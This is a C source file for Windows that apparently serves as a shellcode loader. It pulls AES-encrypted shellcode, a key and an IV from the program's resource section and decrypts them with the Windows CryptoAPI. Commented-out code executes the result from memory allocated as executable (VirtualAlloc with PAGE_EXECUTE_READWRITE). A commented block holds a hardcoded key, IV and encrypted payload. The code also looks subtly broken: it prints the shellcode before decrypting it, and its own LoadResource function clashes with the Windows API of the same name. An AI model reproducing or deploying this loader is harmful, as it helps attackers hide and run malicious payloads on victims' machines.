
#include <windows.h>
#include <stdio.h>
#include <string.h>

/* This is only necessary if your not calling the code from the resource section.
unsigned char key={0xe0,0xd7,0x14,0x57,0xb0,0x36,0xc8,0xbd,0x5e,0x41,0x2b,0x83,0xfe,0xfa,0xe8,0x26};                     
unsigned char iv={0x7a,0x3c,0xc3,0xcb,0x56,0x10,0x24,0xc8,0xc1,0xcb,0xa2,0xfa,0xb8,0x16,0xf1,0xe8};                      
unsigned char ciphertext={0xc0,0xf0,0x4d,0x07,0xc6,0x97,0xba,0xf8,0x81,0xe9,0xd3,0x62,0x4f,0x71,0x0c,0x08,0x54,0x4c,0x7b,0x06,0x5e,0x8a,0x86,0xdc,0xd0,0xac,0xe5,0xa5,0x16,0xec,0x25,0x40,0xfd,0x2b,0x80,0x7f,0x65,0xd2,0x5a,0xb0,0x15,0x47,0x42,0x92,0x04,0xf7,0x4b,0x8a,0x07,0xe8,0x9c,0x65,0x26,0xea,0x44,0xee,0x7b,0xcc,0x9c,0x3a,0x77,0x50,0xf5,0xdc,0x49,0xc1,0xcb,0xf5,0x8a,0x32,0x00,0x73,0x3a,0x7d,0x27,0x0f,0x3a,0x3b,0xab,0x96,0x5e,0x0f,0xac,0x22,0x86,0x84,0x03,0xba,0x09,0xca,0xac,0x24,0x75,0xe8,0x80,0x97,0xbe,0x80,0x1b,0x99,0x25,0xa3,0x4b,0x8a,0xa5,0x25,0x33,0xc7,0x7a,0xa3,0x9e,0x8e,0xcf,0x54,0xcb,0x96,0x39,0xaa,0xe4,0xd3,0xb9,0x15,0x26,0xf9,0xbf,0x23,0xbb,0xf4,0xf8,0xf5,0x73,0xdb,0x4c,0x61,0x2f,0xf2,0xca,0xa1,0xa1,0x87,0xf4,0xc2,0x30,0x34,0x42,0xa9,0x4e,0x35,0xcf,0xd7,0x5d,0x9a,0x3f,0xf4,0x05,0xb0,0x91,0x45,0xd8,0x32,0xb7,0xe3,0xbd,0x44,0xe0,0x47,0x96,0xcf,0xe1,0x94,0x69,0xa7,0xa8,0x50,0x3b,0x54,0x11,0xc5,0x40,0xce,0xf9,0x2f,0x07,0x67,0x27,0x31,0xc9,0x32,0x2b,0x59,0x15,0x15,0xe8,0xa9,0x61,0xd7,0xf8,0xe5,0x9c,0xfc,0x38,0xc8,0x9d,0x39,0x7c,0x6a,0x87,0xd5,0xfc,0x92,0xa2,0xa9,0xe1,0x7a,0xcb,0xe5,0xb3,0x83,0x95,0x02,0x1d,0x4a,0x51,0x28,0x7c,0xee,0x6b,0x32,0x45,0xf7,0x70,0xa4,0xf0,0xb7,0xd9,0x75,0xe9,0xb1,0x96,0x7b,0x98,0xfb,0x68,0x32,0xec,0x53,0x57,0x16,0x24,0x5b,0x32,0x20,0xff,0x06,0x15,0xdc,0x1b,0x5d,0x6f,0x40,0xae,0x0e,0x82,0x99,0xd3,0x4b,0x3c,0xff,0x71,0x1c,0xb3,0x59,0xf2,0x4d,0xa4,0x87,0xa3,0x8f,0x64,0xd9,0x70,0x6b,0x94,0x28,0x58,0x13,0xe3,0xcb,0xcc,0x03,0x15,0xd4,0xe3,0x11,0x3a,0x29,0x30,0xcf,0x17,0x4c,0x86,0xda,0x0b,0x37,0x7a,0xd3,0x93,0xec,0x88,0x71,0xb1,0x3d,0x03,0x80,0x1c,0xb5,0xb2,0xdf,0xfe,0x1e,0x4f,0x73,0x6e,0x6b,0x83,0x45,0xfa,0x8f,0x52,0x53,0xed,0x64,0x95,0x50,0x6a,0xdc,0x0e,0xa0,0xec,0xc7,0x34,0xd8,0xe8,0xad,0xf0,0x88,0x89,0x0c,0x65,0xe7,0xe3,0x42,0xcb,0x2d,0xc3,0x39,0x61,0x18,0xdb,0xf6,0x1b,0xd4,0x0f,0x56,0x3b,0x69,0x50,0x0f,0xc8,0xd6,0xec,0x9f,0x0d,0x99,0x27,0xcc,0x08,0x1f,0x7d,0xb5,0xb9,0xc7,0xb8,0xec,0x78,0x39,0x7d,0xcc,0xdf,0xa2,0x28,0xfa,0xb1,0x97,0x41,0x74,0x5e,0x37,0x55,0xff,0x4d,0xce,0x44,0x7b,0x53,0x85,0xf4,0x54,0x04,0x38,0x8f,0xf9,0xcc,0x79,0x4b,0x6d,0x72,0x61,0x25,0x70,0x67,0x47,0x16,0xfc,0x42,0x51,0xad,0x64,0x90,0xf8,0x23,0xd4,0x66,0xc6,0xc3,0xa6,0x12,0x77,0x4a,0x30,0xcb,0xcb,0xb0,0x56,0x10,0x93,0xf0,0xba,0x6c,0xdd,0x1f,0x52,0x6b,0x3a,0x2d,0x97,0xf2,0x4f,0xe0,0xfe,0x2e,0xdc,0xbf,0xe7};
*/

void LoadResource(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    if (hResource == NULL) {
        printf("Resource not found!\n");
        exit(1);
    }

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void aesdecrypt(char* data, DWORD dataLen, char* key, DWORD keyLen, char* iv, DWORD ivLen) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);
    CryptDecrypt(hKey, 0, FALSE, 0, (BYTE*)data, &dataLen);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

int main() {
    char* AEScode;
    DWORD AEScodesize;

    // Load the encrypted shellcode resource
    LoadResource("AESCODE", &AEScode, &AEScodesize);
    
    char* AESkey;
    DWORD AESkeysize;

    // Load the encrypted shellcode resource
    LoadResource("AESKEY", &AESkey, &AESkeysize);
    
    char* AESiv;
    DWORD AESivsize;

    // Load the encrypted shellcode resource
    LoadResource("AESIV", &AESiv, &AESivsize);
    
    unsigned char final_key[AESkeysize];
    unsigned char final_code[AEScodesize];
    unsigned char final_iv[AESivsize];

   
    memcpy(final_key, AESkey, AESkeysize);
    memcpy(final_code, AEScode, AEScodesize);
    memcpy(final_iv, AESiv, AESivsize);


    

    printf("Decrypted shellcode:\n");
    for (int i = 0; i < sizeof(final_code); i++) {
        printf("\\x%02x", final_code[i]);
    }
    printf("\n");
    
    
    /* Please use your own method/logic or technique
    LPVOID address = VirtualAlloc(NULL, sizeof(final_code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    aesdecrypt((char*)final_code, sizeof(final_code), (char*)final_key, sizeof(final_key), (char*)final_iv, sizeof(final_iv));
    
    memcpy(address, final_code, sizeof(final_code));
    ((void(*)())address)();
    */

    return 0;
}
